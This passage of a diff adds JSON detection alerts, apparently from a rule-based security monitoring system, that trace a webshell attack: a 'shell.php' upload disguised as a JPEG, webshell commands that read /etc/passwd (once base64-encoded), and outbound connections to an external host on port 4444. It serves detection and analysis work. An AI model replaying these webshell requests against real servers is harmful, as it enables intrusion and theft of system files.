+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "src_ip": "198.51.100.23",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0126",
+      "LOG-20261027-0112",
+      "LOG-20261027-0113"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089790Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "e488db10-cb2e-4994-a987-d1ddc9609469",
+    "event_time": "2026-10-28T10:04:12Z",
+    "detect_time": "2026-11-17T09:29:31.096265Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "203.0.113.45",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "upload",
+    "object_type": "uri",
+    "object_id": "/upload.php",
+    "attack_type": "Malicious_Upload",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "检测到可执行脚本上传特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "malicious_upload"
+    ],
+    "evidence": {
+      "src_ip": "203.0.113.45",
+      "uri": "/upload.php /upload.php",
+      "payload": "",
+      "status_code": 200
+    },
+    "related_event_ids": [
+      "LOG-20261028-0201"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096265Z",
+    "related_logs_summary": "user=unknown src_ip=203.0.113.45 action=upload result=success resource=/upload.php"
+  },
+  {
+    "event_id": "edd4af18-816c-4d73-9a41-1d38499b5cc3",
+    "event_time": "2026-10-28T10:05:12Z",
+    "detect_time": "2026-11-17T09:29:31.096318Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "203.0.113.45",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "upload",
+    "object_type": "uri",
+    "object_id": "/upload.php",
+    "attack_type": "Malicious_Upload",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "检测到可执行脚本上传特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "malicious_upload"
+    ],
+    "evidence": {
+      "src_ip": "203.0.113.45",
+      "uri": "/upload.php /upload.php",
+      "payload": "",
+      "status_code": 200
+    },
+    "related_event_ids": [
+      "LOG-20261028-0204"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096318Z",
+    "related_logs_summary": "user=unknown src_ip=203.0.113.45 action=upload result=success resource=/upload.php"
+  },
+  {
+    "event_id": "94b4b7fd-c222-438d-be6a-7575a9434435",
+    "event_time": "2026-10-28T10:05:44Z",
+    "detect_time": "2026-11-17T09:29:31.096392Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "203.0.113.45",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "upload",
+    "object_type": "uri",
+    "object_id": "/upload.php",
+    "attack_type": "Malicious_Upload",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "检测到可执行脚本上传特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "malicious_upload"
+    ],
+    "evidence": {
+      "src_ip": "203.0.113.45",
+      "uri": "/upload.php /upload.php",
+      "payload": "multipart/form-data; name=\"file\"; filename=\"shell.php\"; Content-Type: image/jpeg; size=1873",
+      "status_code": 200
+    },
+    "related_event_ids": [
+      "LOG-20261028-0206"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096392Z",
+    "related_logs_summary": "user=unknown src_ip=203.0.113.45 action=upload result=success resource=/upload.php"
+  },
+  {
+    "event_id": "c4a4b3a2-f30b-4920-bbcb-9f1288ee6adf",
+    "event_time": "2026-10-28T10:06:03Z",
+    "detect_time": "2026-11-17T09:29:31.096435Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "203.0.113.45",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "upload",
+    "object_type": "uri",
+    "object_id": "/uploads/shell.php",
+    "attack_type": "Malicious_Upload",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "检测到可执行脚本上传特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "malicious_upload"
+    ],
+    "evidence": {
+      "src_ip": "203.0.113.45",
+      "uri": "/uploads/shell.php /uploads/shell.php",
+      "payload": "",
+      "status_code": 200
+    },
+    "related_event_ids": [
+      "LOG-20261028-0207"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096435Z",
+    "related_logs_summary": "user=unknown src_ip=203.0.113.45 action=upload result=success resource=/uploads/shell.php"
+  },
+  {
+    "event_id": "3c277171-e778-48ab-a2f6-333d52674834",
+    "event_time": "2026-10-28T10:06:03Z",
+    "detect_time": "2026-11-17T09:29:31.096467Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "203.0.113.45",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "upload",
+    "object_type": "uri",
+    "object_id": "/uploads/shell.php",
+    "attack_type": "Webshell_Access",
+    "risk_score": 35.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 0,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "访问疑似webshell脚本"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "webshell_access"
+    ],
+    "evidence": {
+      "src_ip": "203.0.113.45",
+      "uri": "/uploads/shell.php /uploads/shell.php",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
+    },
+    "related_event_ids": [
+      "LOG-20261028-0207"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096467Z",
+    "related_logs_summary": "user=unknown src_ip=203.0.113.45 action=upload result=success resource=/uploads/shell.php"
+  },
+  {
+    "event_id": "f5b0026e-f867-4193-8119-3b74322fc5ab",
+    "event_time": "2026-10-28T10:06:20Z",
+    "detect_time": "2026-11-17T09:29:31.096507Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "203.0.113.45",
+    "host": "web-prod-01",
+    "source_type": "security_device",
+    "action": "upload",
+    "object_type": "uri",
+    "object_id": "/uploads/shell.php",
+    "attack_type": "Malicious_Upload",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "检测到可执行脚本上传特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "malicious_upload"
+    ],
+    "evidence": {
+      "src_ip": "203.0.113.45",
+      "uri": "/uploads/shell.php /uploads/shell.php",
+      "payload": "",
+      "status_code": 200
+    },
+    "related_event_ids": [
+      "LOG-20261028-0208"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096507Z",
+    "related_logs_summary": "user=unknown src_ip=203.0.113.45 action=upload result=success resource=/uploads/shell.php"
+  },
+  {
+    "event_id": "2cae2ba8-f136-49eb-9322-22e7b03b7b20",
+    "event_time": "2026-10-28T10:06:20Z",
+    "detect_time": "2026-11-17T09:29:31.096557Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "203.0.113.45",
+    "host": "web-prod-01",
+    "source_type": "security_device",
+    "action": "upload",
+    "object_type": "uri",
+    "object_id": "/uploads/shell.php",
+    "attack_type": "Webshell_Access",
+    "risk_score": 35.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 0,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "访问疑似webshell脚本"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "webshell_access"
+    ],
+    "evidence": {
+      "src_ip": "203.0.113.45",
+      "uri": "/uploads/shell.php /uploads/shell.php",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
+    },
+    "related_event_ids": [
+      "LOG-20261028-0208"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096557Z",
+    "related_logs_summary": "user=unknown src_ip=203.0.113.45 action=upload result=success resource=/uploads/shell.php"
+  },
+  {
+    "event_id": "dec503fe-fe0a-4c4e-a851-0aba06036a61",
+    "event_time": "2026-10-28T10:07:15Z",
+    "detect_time": "2026-11-17T09:29:31.096627Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "203.0.113.45",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "upload",
+    "object_type": "uri",
+    "object_id": "/uploads/shell.php",
+    "attack_type": "Malicious_Upload",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "检测到可执行脚本上传特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "malicious_upload"
+    ],
+    "evidence": {
+      "src_ip": "203.0.113.45",
+      "uri": "/uploads/shell.php /uploads/shell.php",
+      "payload": "cmd=Y2F0IC9ldGMvcGFzc3dk",
+      "status_code": 200
+    },
+    "related_event_ids": [
+      "LOG-20261028-0210"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096627Z",
+    "related_logs_summary": "user=unknown src_ip=203.0.113.45 action=upload result=success resource=/uploads/shell.php"
+  },
+  {
+    "event_id": "c11b379e-3510-46ee-be4a-e8dc18431cfa",
+    "event_time": "2026-10-28T10:07:15Z",
+    "detect_time": "2026-11-17T09:29:31.096655Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "203.0.113.45",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "upload",
+    "object_type": "uri",
+    "object_id": "/uploads/shell.php",
+    "attack_type": "Webshell_Access",
+    "risk_score": 35.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 0,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "访问疑似webshell脚本"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "webshell_access"
+    ],
+    "evidence": {
+      "src_ip": "203.0.113.45",
+      "uri": "/uploads/shell.php /uploads/shell.php",
+      "status_code": 200,
+      "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
+    },
+    "related_event_ids": [
+      "LOG-20261028-0210"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096655Z",
+    "related_logs_summary": "user=unknown src_ip=203.0.113.45 action=upload result=success resource=/uploads/shell.php"
+  },
+  {
+    "event_id": "7674e823-5861-44a1-86ce-fbc423d6854d",
+    "event_time": "2026-10-28T10:07:33Z",
+    "detect_time": "2026-11-17T09:29:31.096703Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "10.0.0.15",
+    "host": "web-prod-01",
+    "source_type": "security_device",
+    "action": "connect",
+    "object_type": "session",
+    "object_id": "45.77.128.203:4444",
+    "attack_type": "Suspicious_Outbound",
+    "risk_score": 35.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 0,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "内网资产向外部非常用端口发起连接"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "suspicious_outbound"
+    ],
+    "evidence": {
+      "internal_ip": "10.0.0.15",
+      "external_ip": "45.77.128.203",
+      "external_port": 4444,
+      "conn_state": "conn_state=SF;duration=512.3"
+    },
+    "related_event_ids": [
+      "LOG-20261028-0211"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096703Z",
+    "related_logs_summary": "user=unknown src_ip=10.0.0.15 action=connect result=success resource=45.77.128.203:4444"
+  },
+  {
+    "event_id": "a90d761d-2674-4e18-a86e-0e7cef4ec15e",
+    "event_time": "2026-10-28T10:08:40Z",
+    "detect_time": "2026-11-17T09:29:31.096756Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "203.0.113.45",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "upload",
+    "object_type": "uri",
+    "object_id": "/uploads/shell.php?cmd=cat+/etc/passwd",
+    "attack_type": "Path_Traversal",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "URI包含路径遍历特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "path_traversal"
+    ],
+    "evidence": {
+      "src_ip": "203.0.113.45",
+      "uri": "/uploads/shell.php?cmd=cat+/etc/passwd /uploads/shell.php?cmd=cat+/etc/passwd",
+      "matched": "/etc/passwd"
+    },
+    "related_event_ids": [
+      "LOG-20261028-0213"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096756Z",
+    "related_logs_summary": "user=unknown src_ip=203.0.113.45 action=upload result=success resource=/uploads/shell.php?cmd=cat+/etc/passwd"
+  },
+  {
+    "event_id": "d11cbf0a-4007-4cf5-b921-9791696c7bea",
+    "event_time": "2026-10-28T10:09:10Z",
+    "detect_time": "2026-11-17T09:29:31.096839Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "10.0.0.15",
+    "host": "web-prod-01",
+    "source_type": "security_device",
+    "action": "connect",
+    "object_type": "session",
+    "object_id": "45.77.128.203:4444",
+    "attack_type": "Suspicious_Outbound",
+    "risk_score": 35.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 0,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "内网资产向外部非常用端口发起连接"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "suspicious_outbound"
+    ],
+    "evidence": {
+      "internal_ip": "10.0.0.15",
+      "external_ip": "45.77.128.203",
+      "external_port": 4444,
+      "conn_state": "conn_state=SF;duration=301.7"
+    },
+    "related_event_ids": [
+      "LOG-20261028-0214"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096839Z",
+    "related_logs_summary": "user=unknown src_ip=10.0.0.15 action=connect result=success resource=45.77.128.203:4444"
+  },
+  {
+    "event_id": "4fb1e607-2c2e-4ebc-bcfe-e59480c770fd",
+    "event_time": "2026-10-28T10:10:30Z",
+    "detect_time": "2026-11-17T09:29:31.096887Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "10.0.0.15",
+    "host": "web-prod-01",
+    "source_type": "security_device",
+    "action": "connect",
+    "object_type": "session",
+    "object_id": "45.77.128.203:4444",
+    "attack_type": "Suspicious_Outbound",
+    "risk_score": 35.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 0,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "内网资产向外部非常用端口发起连接"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "suspicious_outbound"
+    ],
+    "evidence": {
+      "internal_ip": "10.0.0.15",
+      "external_ip": "45.77.128.203",
+      "external_port": 4444,
+      "conn_state": "conn_state=SF;duration=288.2"
+    },
+    "related_event_ids": [
+      "LOG-20261028-0215"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096887Z",
+    "related_logs_summary": "user=unknown src_ip=10.0.0.15 action=connect result=success resource=45.77.128.203:4444"
+  },
+  {
+    "event_id": "anom-3906249013437276969c5bd4c2c74f63",
+    "event_time": "2026-10-29T18:00:05Z",
+    "detect_time": "2026-11-17T09:29:31.090318Z",
+    "tenant_id": "default",
+    "user_id": "ops_zhang",
+    "src_ip": "10.0.0.66",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 25.0,
+    "risk_level": "low",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "baseline_history",
+        "profile_group": "why",
+        "expected": "sufficient_user_baseline",
+        "actual": "confidence 0.54, sample_days 1",
+        "deviation_type": "low_baseline_confidence",
+        "severity": "low",
+        "confidence": 0.54,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "new_source_ip",
+      "maintenance_window",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "user_id": "ops_zhang",
+      "new_ip": "10.0.0.66",
+      "risk_mitigations": [
+        "maintenance_window",
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261029-0301"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.090318Z",
+    "related_logs_summary": "user=ops_zhang src_ip=10.0.0.66 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-fbf6a6896c75ba4922776c9884d97738",
+    "event_time": "2026-10-29T18:00:05Z",
+    "detect_time": "2026-11-17T09:29:31.090495Z",
+    "tenant_id": "default",
+    "user_id": "ops_zhang",
+    "src_ip": "10.0.0.66",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 25.0,
+    "risk_level": "low",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "baseline_history",
+        "profile_group": "why",
+        "expected": "sufficient_user_baseline",
+        "actual": "confidence 0.54, sample_days 1",
+        "deviation_type": "low_baseline_confidence",
+        "severity": "low",
+        "confidence": 0.54,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "new_source_ip",
+      "maintenance_window",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "user_id": "ops_zhang",
+      "new_ip": "10.0.0.66",
+      "risk_mitigations": [
+        "maintenance_window",
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261029-0302"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.090495Z",
+    "related_logs_summary": "user=ops_zhang src_ip=10.0.0.66 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-34d35d4d600841a77e2f25e850a5aa02",
+    "event_time": "2026-10-29T18:00:05Z",
+    "detect_time": "2026-11-17T09:29:31.090373Z",
+    "tenant_id": "default",
+    "user_id": "ops_zhang",
+    "src_ip": "10.0.0.66",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 50.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "baseline_history",
+        "profile_group": "why",
+        "expected": "sufficient_user_baseline",
+        "actual": "confidence 0.54, sample_days 1",
+        "deviation_type": "low_baseline_confidence",
+        "severity": "low",
+        "confidence": 0.54,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access",
+      "maintenance_window",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "user_id": "ops_zhang",
+      "src_ip": "10.0.0.66",
+      "resource": "/admin/login.php",
+      "risk_mitigations": [
+        "maintenance_window",
+        "allowlisted_context"
+      ],
+      "downgraded_by": "maintenance_window+allowlist"
+    },
+    "related_event_ids": [
+      "LOG-20261029-0301"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.090373Z",
+    "related_logs_summary": "user=ops_zhang src_ip=10.0.0.66 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-c89c8f54e21af7e4fb765dfca7c18637",
+    "event_time": "2026-10-29T18:00:05Z",
+    "detect_time": "2026-11-17T09:29:31.090548Z",
+    "tenant_id": "default",
+    "user_id": "ops_zhang",
+    "src_ip": "10.0.0.66",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 50.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "baseline_history",
+        "profile_group": "why",
+        "expected": "sufficient_user_baseline",
+        "actual": "confidence 0.54, sample_days 1",
+        "deviation_type": "low_baseline_confidence",
+        "severity": "low",
+        "confidence": 0.54,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access",
+      "maintenance_window",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "user_id": "ops_zhang",
+      "src_ip": "10.0.0.66",
+      "resource": "/admin/login.php",
+      "risk_mitigations": [
+        "maintenance_window",
+        "allowlisted_context"
+      ],
+      "downgraded_by": "maintenance_window+allowlist"
+    },
+    "related_event_ids": [
+      "LOG-20261029-0302",
+      "LOG-20261029-0301"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.090548Z",
+    "related_logs_summary": "user=ops_zhang src_ip=10.0.0.66 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-6fa9301e75262bfe403951aa6e17832a",
+    "event_time": "2026-10-29T18:00:05Z",
+    "detect_time": "2026-11-17T09:29:31.090411Z",
+    "tenant_id": "default",
+    "user_id": "ops_zhang",
+    "src_ip": "10.0.0.66",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": -10
+    },
+    "rule_hits": [
+      "普通用户访问admin接口"
+    ],
+    "baseline_deviations": [
+      {
+        "feature": "baseline_history",
+        "profile_group": "why",
+        "expected": "sufficient_user_baseline",
+        "actual": "confidence 0.54, sample_days 1",
+        "deviation_type": "low_baseline_confidence",
+        "severity": "low",
+        "confidence": 0.54,
+        "evidence_source": "user_baseline",
+        "sample_days": 1,
+        "period_type": "global",
+        "period_key": "all",
+        "model_version": "baseline-v1",
+        "fallback_level": "none"
+      }
+    ],
+    "reason_codes": [
+      "admin_resource_access",
+      "maintenance_window",
+      "allowlisted_context"
+    ],
+    "evidence": {
+      "resource": "/admin/login.php",
+      "user_id": "ops_zhang",
+      "risk_mitigations": [
+        "maintenance_window",
+        "allowlisted_context"
+      ]
+    },
+    "related_event_ids": [
+      "LOG-20261029-0301"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.090411Z",
+    "related_logs_summary": "user=ops_zhang src_ip=10.0.0.66 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-3d2b80dcc11fe3b493e8c6509008c8b2",
+    "event_time": "2026-10-29T18:00:05Z",
+    "detect_time": "2026-11-17T09:29:31.090583Z",
+    "tenant_id": "default",
+    "user_id": "ops_zhang",
+    "src_ip": "10.0.0.66",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "privilege_abuse",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 10,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
